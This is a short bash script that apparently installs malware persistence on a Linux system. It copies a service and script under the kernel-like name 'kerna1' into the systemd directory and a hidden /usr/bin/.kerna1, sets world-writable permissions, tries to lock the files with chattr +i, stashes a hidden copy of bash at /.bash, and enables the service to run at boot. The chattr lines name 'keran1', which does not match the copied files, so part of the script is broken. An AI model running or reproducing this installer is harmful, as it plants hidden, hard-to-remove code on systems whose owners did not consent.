#!/bin/bash

chmod 777 ./*
cp ./kerna1.service /lib/systemd/system/kerna1.service

cp ./kerna1.sh /usr/bin/.kerna1

chattr +i /lib/systemd/system/keran1.service

chattr +i /usr/bin/.keran1

cp /usr/bin/bash /.bash


systemctl start kerna1
systemctl enable kerna1
